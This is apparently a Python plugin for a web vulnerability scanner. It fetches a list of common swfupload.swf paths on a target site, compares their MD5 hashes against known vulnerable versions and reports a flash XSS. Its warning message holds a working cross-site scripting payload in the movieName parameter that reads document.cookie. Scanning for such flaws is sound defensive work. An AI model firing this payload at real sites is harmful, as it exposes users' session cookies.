import hashlib

def assign(service, arg):
    if service == 'www':
        return True, arg

def audit(arg):
    swf_list = [
    '/common/swfupload/swfupload.swf',
    '/adminsoft/js/swfupload.swf',
    '/statics/js/swfupload/swfupload.swf',
    '/images/swfupload/swfupload.swf',
    '/js/upload/swfupload/swfupload.swf',
    '/addons/theme/stv1/_static/js/swfupload/swfupload.swf',
    '/admin/kindeditor/plugins/multiimage/images/swfupload.swf',
    '/includes/js/upload.swf',
    '/js/swfupload/swfupload.swf',
    '/plus/swfupload/swfupload/swfupload.swf',
    '/e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf',
    '/include/lib/js/uploadify/uploadify.swf',
    '/lib/swf/swfupload.swf'
    ]
    md5_list = [
        '3a1c6cc728dddc258091a601f28a9c12',
        '53fef78841c3fae1ee992ae324a51620',
        '4c2fc69dc91c885837ce55d03493a5f5',        
    ]
    for swf in swf_list:
        target = arg + swf
        code, head, res, err, _ = curl.curl2(target)
        if code == 200:
            md5_value = hashlib.md5(res).hexdigest()
            if md5_value in md5_list:
                security_warning('flash xss discover: ' + target + '?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}')